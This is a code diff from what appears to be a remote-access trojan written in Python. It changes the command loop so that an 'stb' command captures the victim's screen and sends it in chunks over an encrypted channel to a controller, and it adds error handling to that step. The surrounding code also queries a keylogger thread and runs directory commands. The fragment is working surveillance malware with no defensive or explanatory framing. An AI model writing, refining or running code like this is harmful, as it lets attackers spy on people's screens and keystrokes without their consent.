@@ -45,16 +45,20 @@ while True:
                     encrypter.send_message_client(("No such directory : " +os.getcwd()))
     elif command == "stb" :
         im = ImageGrab.grab()
-        im.save('pic.png')
-        encrypter.send_message_client(("capturing"))
-        pic = open("pic.png", "rb")
-        picRead = pic.read(2048)
-        while picRead != b'':
-            encrypter.send_picture_client(picRead)
+        try :
+            im.save('pic.png')
+            encrypter.send_message_client(("capturing"))
+            pic = open("pic.png", "rb")
             picRead = pic.read(2048)
-        pic.close()
-        os.remove("pic.png")
-        encrypter.send_message_client(("complete"))
+            while picRead != b'':
+                encrypter.send_picture_client(picRead)
+                picRead = pic.read(2048)
+            pic.close()
+            os.remove("pic.png")
+            encrypter.send_message_client(("complete"))
+        except:
+            encrypter.send_message_client(("permissionsfailed"))
+
     elif command == "keylogger.status" :
         if KeyLoggerThread.isAlive() :
             encrypter.send_message_client(("ACTIVATED"))
